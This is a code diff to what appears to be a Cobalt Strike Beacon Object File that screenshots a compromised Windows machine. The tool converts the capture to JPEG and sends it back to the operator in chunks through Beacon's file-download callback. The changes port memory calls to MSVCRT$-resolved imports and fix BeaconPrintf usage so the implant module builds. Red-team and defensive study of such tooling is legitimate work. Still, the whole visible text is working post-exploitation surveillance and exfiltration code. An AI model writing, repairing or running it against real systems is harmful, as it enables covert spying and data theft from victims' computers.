@@ -5,6 +5,11 @@
 #include "bofdefs.h"
 #include <gdiplus.h>    
 
+#include <gdiplus.h>
+
+/* beacon.h declares BeaconPrintf(int, char*, ...) — suppress const-to-non-const */
+#define BeaconPrintf(type, fmt, ...) (BeaconPrintf)((type), (char*)(fmt), ##__VA_ARGS__)
+
 #pragma comment(lib, "User32.lib")
 
 /*
@@ -334,7 +339,7 @@ void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, 
                     packedChunk[chunkIndex++] = returnData[i];
                 }
                 BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
-                free(packedChunk);
+                MSVCRT$free(packedChunk);
             }
             else {
                 int lastChunkLength = fileSize - index + 4;
@@ -348,7 +353,7 @@ void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, 
                     lastChunk[lastChunkIndex++] = returnData[i];
                 }
                 BeaconOutput(CALLBACK_FILE_WRITE, lastChunk, lastChunkLength);
-                free(lastChunk);
+                MSVCRT$free(lastChunk);
             }
             index += chunkSize;
         }
@@ -365,7 +370,7 @@ void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, 
             packedChunk[chunkIndex++] = returnData[i];
         }
         BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
-        free(packedChunk);
+        MSVCRT$free(packedChunk);
     }
 
     char packedClose[4];
@@ -375,7 +380,7 @@ void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, 
     packedClose[3] = fileId & 0xFF;
     BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);
 
-    free(packedData);
+    MSVCRT$free(packedData);
 }
 
 //-------------------------------------------------------------
@@ -503,7 +508,7 @@ BOOL BitmapToJpeg(HBITMAP hBitmap, int quality, int grayscale, BYTE** pJpegData,
     }
 
     *pJpegSize = (DWORD)uliSize.QuadPart;
-    *pJpegData = (BYTE*)malloc(*pJpegSize);
+    *pJpegData = (BYTE*)MSVCRT$malloc(*pJpegSize);
     if (!*pJpegData) {
         pStream->Release();
         pGdipDisposeImage((GpImage*)pGpBitmap);
@@ -512,7 +517,7 @@ BOOL BitmapToJpeg(HBITMAP hBitmap, int quality, int grayscale, BYTE** pJpegData,
     }
 
     if (pStream->Seek(liZero, STREAM_SEEK_SET, NULL) != S_OK) {
-        free(*pJpegData);
+        MSVCRT$free(*pJpegData);
         pStream->Release();
         pGdipDisposeImage((GpImage*)pGpBitmap);
         pGdiplusShutdown(gdiplusToken);
@@ -521,7 +526,7 @@ BOOL BitmapToJpeg(HBITMAP hBitmap, int quality, int grayscale, BYTE** pJpegData,
 
     ULONG bytesRead = 0;
     if (pStream->Read(*pJpegData, *pJpegSize, &bytesRead) != S_OK || bytesRead != *pJpegSize) {
-        free(*pJpegData);
+        MSVCRT$free(*pJpegData);
         pStream->Release();
         pGdipDisposeImage((GpImage*)pGpBitmap);
         pGdiplusShutdown(gdiplusToken);
@@ -593,7 +598,7 @@ BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName, int savemethod, in
         HANDLE fh = pCreateFileA(lpszFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
             FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
         if (fh == INVALID_HANDLE_VALUE) {
-            free(jpegData);
+            MSVCRT$free(jpegData);
             return FALSE;
         }
         DWORD dwWritten;
@@ -626,11 +631,11 @@ BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName, int savemethod, in
     }
     else {
         BeaconPrintf(CALLBACK_ERROR, "Unknown savemethod specified: %d", savemethod);
-        free(jpegData);
+        MSVCRT$free(jpegData);
         return FALSE;
     }
 
-    free(jpegData);
+    MSVCRT$free(jpegData);
     return TRUE;
 }
 
@@ -924,7 +929,7 @@ void go(char* buff, int len)
         if (!SaveHBITMAPToFile(hBitmap, filename, savemethod, grayscale, quality, scale))
             BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to save JPEG");
         else
-            BeaconPrintf(CALLBACK_OUTPUT, "Screenshot saved/downloaded successfully", filename);
+            BeaconPrintf(CALLBACK_OUTPUT, "Screenshot saved/downloaded successfully");
         pDeleteObject(hBitmap);
     }
 }
